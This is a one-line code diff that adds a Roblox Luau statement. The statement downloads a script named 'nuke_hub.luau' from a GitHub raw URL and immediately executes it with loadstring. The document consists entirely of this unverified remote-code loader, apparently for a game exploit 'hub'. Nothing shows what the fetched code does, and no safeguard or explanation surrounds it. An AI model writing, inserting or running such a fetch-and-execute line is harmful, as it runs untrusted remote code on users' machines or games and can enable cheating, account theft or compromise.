@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tr1xxis1337-jpg/scripts/refs/heads/main/nuke_hub.luau"))()
